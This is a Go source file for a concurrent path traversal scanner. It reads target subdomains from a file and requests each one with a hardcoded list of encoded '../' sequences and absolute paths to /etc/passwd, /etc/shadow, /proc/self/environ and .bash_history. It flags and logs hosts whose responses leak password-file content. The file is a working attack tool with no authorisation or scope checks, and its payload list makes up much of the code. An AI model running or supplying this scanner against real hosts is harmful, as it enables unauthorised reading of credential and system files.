package main

import (
	"bufio"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

var payloads = []string{
	"../", "..\\", "..\\/", "%2e%2e%2f", "%252e%252e%252f", "%c0%ae%c0%ae%c0%af",
	"%uff0e%uff0e%u2215", "%uff0e%uff0e%u2216", ".%u002e", "/%u2215", "\\%u2216",
	"%c0%2e", "%e0%40%ae", "%c0ae", "%c0%af", "%e0%80%af", "%c0%2f", "%c0%5c", "%c0%80%5c",
	"..././", "...\\.\\", "..;/", "..;/..;/sensitive.txt", "%252e", "%252f", "%255c",
	"file:///etc/passwd", "http://127.0.0.1:8080", "/etc/issue", "/etc/passwd",
	"/etc/shadow", "/etc/group", "/etc/hosts", "/etc/motd", "/etc/mysql/my.cnf",
	"/proc/self/environ", "/proc/version", "/proc/cmdline", "/proc/mounts",
	"/proc/self/cwd/index.php", "/home/$USER/.bash_history", "/var/log/nginx/error.log",
	"%252e%252e/%252e%252e/%252e%252e//etc/passwd", "../../../../../etc/passwd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd", "/../../../../../../../../../etc/passwd%00.jpg",
}

var authHeader = "" // Set your Bearer token if needed

func scanURL(target, payload string, wg *sync.WaitGroup, mutex *sync.Mutex) {
	defer wg.Done()

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	url := strings.TrimRight(target, "/") + "/" + strings.TrimLeft(payload, "/")

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		color.Red("[-] Failed to build request for %s", url)
		return
	}

	if authHeader != "" {
		req.Header.Set("Authorization", "Bearer "+authHeader)
	}

	resp, err := client.Do(req)
	if err != nil {
		color.Red("[-] Error accessing %s", url)
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		color.Red("[-] Failed to read response body for %s", url)
		return
	}
	body := string(bodyBytes)

	if strings.Contains(body, "root:x:") || strings.Contains(body, "[boot loader]") ||
		strings.Contains(body, "[fonts]") || strings.Contains(body, "root:") {
		color.Green("[+] VULNERABLE: %s => potential traversal!", url)
		mutex.Lock()
		f, _ := os.OpenFile("vulnerable.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		defer f.Close()
		f.WriteString(url + "\n")
		mutex.Unlock()
	} else {
		color.Red("[-] Not vulnerable: %s", url)
	}
}

func main() {
	if len(os.Args) < 2 {
		log.Fatal("Usage: go run path_traversal_checker.go <subdomains.txt>")
	}

	filePath := os.Args[1]
	file, err := os.Open(filePath)
	if err != nil {
		log.Fatalf("[-] Could not read %s: %v", filePath, err)
	}
	defer file.Close()

	var wg sync.WaitGroup
	var mutex sync.Mutex
	scanner := bufio.NewScanner(file)

	var targets []string
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			if !strings.HasPrefix(line, "http") {
				line = "http://" + line
			}
			targets = append(targets, line)
		}
	}

	if len(targets) == 0 {
		log.Fatal("[-] No valid targets found in file.")
	}

	for _, target := range targets {
		for _, payload := range payloads {
			wg.Add(1)
			go scanURL(target, payload, &wg, &mutex)
		}
	}

	wg.Wait()
	color.Cyan("\n✅ Scan complete. Results saved to vulnerable.txt")
}
